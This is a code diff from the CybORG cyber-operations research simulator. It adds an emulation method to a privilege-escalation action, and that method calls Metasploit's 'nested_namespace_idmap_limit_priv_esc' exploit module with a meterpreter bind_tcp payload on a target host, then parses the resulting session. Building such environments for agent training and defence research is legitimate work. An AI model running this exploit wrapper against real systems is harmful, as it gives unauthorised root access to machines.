@@ -14,17 +14,20 @@ from CybORG.Simulator.Process import Process
 from CybORG.Simulator.State import State
 
 
-class MSFNestedUserNamespaceLimit(MSFPrivilegeEscalation):
+class MSFSubUidShell(MSFPrivilegeEscalation):
     """
-    Implements the NestedUserNamespaceLimit permissions escalation action
+    Implements the SubUidShell permissions escalation action
     """
     def __init__(self, session: int, agent: str, ip_address: IPv4Address):
         super().__init__(session, agent)
         self.ip_address = ip_address
+
     def sim_execute(self, state: State) -> Observation:
         # comment out the below and implement AbstractActions/PrivilegeEscalation logic
         #return self.sim_escalate(state, "root")
 
+        # implement equivalent of session handler within State object
+        # sessions = state.get_sessions_by_remote_ip(self.ip_address)
         # find session on the chosen host
         hostname = state.ip_addresses[self.ip_address]
         print("hostname")
@@ -69,9 +72,59 @@ class MSFNestedUserNamespaceLimit(MSFPrivilegeEscalation):
         return obs
 
 
-    def emu_execute(self) -> Observation:
-        # Need to implement this in MSF 
-        raise NotImplementedError
+    def emu_execute(self, session_handler) -> Observation:
+        obs = Observation()
+        user = None
+        from CybORG.Emulator.Session import MSFSessionHandler
+        if type(session_handler) is not MSFSessionHandler:
+            obs.set_success(False)
+            return obs
+        print("server session {}".format(self.session))
+        # get sessions for the target_host
+        target_sessions = session_handler.get_session_by_remote_ip(str(self.ip_address), session_type="shell")
+        if len(target_sessions) == 0:
+            obs.set_success(False)
+            return obs
+        else:
+          target_session = target_sessions[0]
+          output = session_handler.execute_module(mtype='exploit', 
+                                         mname='linux/local/nested_namespace_idmap_limit_priv_esc',
+                                         opts = { "SESSION": target_session },
+                                         payload_name="linux/x86/meterpreter/bind_tcp",
+                                         payload_opts={'RHOST': str(self.ip_address)})
+          obs.add_raw_obs(output)
+          obs.set_success(False)
+          session = None
+          try:
+            for line in output.split('\n'):
+              if '[*] Meterpreter session' in line:
+                obs.set_success(True)
+                #print(list(enumerate(line.split(' '))))
+                split = line.split(' ')
+                session = int(split[3])
+                if '-' in split[5]:
+                    temp = split[5].replace('(', '').split(':')[0]
+                    origin, rip = temp.split('-')
+                    # obs.add_process(remote_address=rip, local_address=origin)
+                    rport = None
+                else:
+                    rip, rport = split[5].replace('(', '').split(':')
+                lip, lport = split[7].replace(')', '').split(':')
+                obs.add_process(hostid=str(self.ip_address), local_address=lip, local_port=lport, remote_address=rip, remote_port=rport)
+            # get user id of session
+            print("get user from session")
+            user = session_handler.get_session_user(session)
+            print(user)
+            if user is None:
+              obs = Observation()
+              obs.set_success(False)
+            else:
+              obs.add_session_info(hostid=str(self.ip_address), username=user, session_id=session, session_type='meterpreter', agent=self.agent)
+          except Exception as ex:
+            session_handler._log_debug(f'Error occured in parsing of output: {output}')
+            raise ex
+        session_handler._log_debug(output)
+        return obs
 
     def test_exploit_works(self, target_host: Host) -> Tuple[bool, Tuple[Process,...]]:
         # the exact patches and OS distributions are described here:
